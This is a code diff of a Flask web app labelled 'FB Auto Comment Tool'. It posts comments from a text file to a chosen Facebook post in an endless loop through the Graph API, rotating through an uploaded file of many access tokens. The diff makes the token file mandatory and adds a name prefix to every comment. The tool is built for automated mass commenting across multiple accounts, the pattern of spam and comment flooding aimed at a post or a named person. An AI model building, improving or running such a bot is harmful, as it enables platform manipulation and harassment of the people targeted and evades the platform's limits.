@@ -1,11 +1,11 @@
 # main.py
 import os
 import time
-import random
-import string
 from threading import Thread, Event
 from flask import Flask, request, render_template_string
 import requests
+import random
+import string
 
 app = Flask(__name__)
 app.debug = True
@@ -16,18 +16,18 @@ tasks = {}
 # ---------------- Headers ----------------
 headers = {
     "User-Agent": "Mozilla/5.0",
-    "Post-Server": "by Aarav Shrivastava"
+    "Post-Server": "FB Auto Comment Tool by Aarav Shrivastava"
 }
 
 # ---------------- Worker ----------------
-def worker_comment(task_id, access_tokens, post_id, interval, comments):
+def worker_comment(task_id, access_tokens, post_id, prefix, interval, comments):
     stop_event = tasks[task_id]["stop"]
     index = 0
     token_index = 0
 
     while not stop_event.is_set():
         try:
-            comment = comments[index]
+            comment = f"{prefix} {comments[index]}"
             current_token = access_tokens[token_index]
 
             url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
@@ -50,70 +50,79 @@ def worker_comment(task_id, access_tokens, post_id, interval, comments):
 
 # ---------------- HTML ----------------
 INDEX_HTML = """
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>FB Auto Comment Bot</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body { background: linear-gradient(135deg,#0f172a,#0ea5e9); color:#e6eef8; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; }
-    .card { border-radius: 14px; box-shadow: 0 10px 30px rgba(2,6,23,0.6); background: linear-gradient(180deg,#ffffff,#f7fbff); color:#042a48; }
-    label { font-weight:600; color:#0b2540; }
-    textarea.form-control { height:120px; resize:vertical; }
-    .muted { color:#5b6b76; font-size:0.9rem; }
-  </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB Auto Comment Tool by Aarav Shrivastava</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: white;
+            color: black;
+        }
+        .container {
+            max-width: 400px;
+            min-height: 600px;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 0 15px gray;
+            margin-bottom: 20px;
+        }
+        .form-control {
+            border: 1px solid black;
+            background: #f9f9f9;
+            height: 40px;
+            padding: 7px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            color: black;
+        }
+        .header { text-align: center; padding-bottom: 20px; }
+        .btn-submit { width: 100%; margin-top: 10px; }
+    </style>
 </head>
 <body>
-  <div class="container py-5">
-    <div class="row justify-content-center">
-      <div class="col-md-8 col-lg-6">
-        <div class="card p-4">
-          <h3 class="text-center mb-3">FB Auto Comment Bot</h3>
-
-          <form method="post" enctype="multipart/form-data">
-            <div class="mb-3">
-              <label>Single Access Token</label>
-              <textarea name="singleToken" class="form-control" placeholder="EAAG..."></textarea>
-            </div>
-
-            <div class="mb-3">
-              <label>Or Upload Token File (one per line)</label>
-              <input type="file" name="tokenFile" class="form-control">
-            </div>
-
-            <div class="mb-3">
-              <label>Post ID</label>
-              <input type="text" name="postId" class="form-control" placeholder="1234567890" required>
-            </div>
-
-            <div class="mb-3">
-              <label>Time Delay (seconds)</label>
-              <input type="number" name="time" class="form-control" value="10" min="1">
-            </div>
-
-            <div class="mb-3">
-              <label>Comments File (.txt)</label>
-              <input type="file" name="txtFile" class="form-control" required>
-              <div class="muted">One comment per line</div>
-            </div>
-
-            <button class="btn btn-primary w-100 mb-2">Start Commenting</button>
-          </form>
-
-          <hr>
-          <form method="post" action="/stop">
-            <label>Stop Task ID</label>
-            <input type="text" name="taskId" class="form-control" placeholder="Enter task id">
-            <button class="btn btn-danger mt-2 w-100">Stop</button>
-          </form>
-
-          <div class="mt-3 text-center">
-            <a class="btn btn-outline-secondary w-100" href="/status">View Active Tasks</a>
-          </div>
-        </div>
+  <header class="header mt-4">
+    <h2 class="mt-3">FB Auto Comment Tool by Aarav Shrivastava</h2>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data" id="commentForm">
+      <div class="mb-3">
+        <label for="tokenFile" class="form-label">Upload Token File (one per line)</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
       </div>
+      <div class="mb-3">
+        <label for="postId" class="form-label">Post ID</label>
+        <input type="text" class="form-control" id="postId" name="postId" required>
+      </div>
+      <div class="mb-3">
+        <label for="prefix" class="form-label">Prefix / Name</label>
+        <input type="text" class="form-control" id="prefix" name="prefix" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Time Delay (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" value="10" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Comments File (.txt)</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Start Auto Commenting</button>
+      <div id="status" style="display:none;"></div>
+    </form>
+    
+    <form method="post" action="/stop" id="stopForm" class="mt-4">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Task</button>
+    </form>
+    
+    <div class="mt-3 text-center">
+      <a class="btn btn-outline-secondary w-100" href="/status">View Active Tasks</a>
     </div>
   </div>
 </body>
@@ -124,20 +133,17 @@ INDEX_HTML = """
 @app.route("/", methods=["GET", "POST"])
 def index():
     if request.method == "POST":
-        # Token Handling
-        access_tokens = []
-        single_token = request.form.get("singleToken", "").strip()
+        # Token file upload only
         token_file = request.files.get("tokenFile")
-
-        if token_file and token_file.filename:
-            access_tokens = token_file.read().decode().strip().splitlines()
-        elif single_token:
-            access_tokens = [single_token]
-
+        if not token_file or not token_file.filename:
+            return "Token file is required", 400
+        access_tokens = token_file.read().decode().strip().splitlines()
         if not access_tokens:
-            return "At least one token is required", 400
+            return "No tokens found in file", 400
 
         post_id = request.form.get("postId", "").strip()
+        prefix = request.form.get("prefix", "").strip()
+
         try:
             interval = int(request.form.get("time", "10"))
         except:
@@ -153,7 +159,7 @@ def index():
         task_id = os.urandom(4).hex()
         stop_ev = Event()
         tasks[task_id] = {"thread": None, "stop": stop_ev}
-        t = Thread(target=worker_comment, args=(task_id, access_tokens, post_id, interval, comments))
+        t = Thread(target=worker_comment, args=(task_id, access_tokens, post_id, prefix, interval, comments))
         tasks[task_id]["thread"] = t
         t.daemon = False
         t.start()
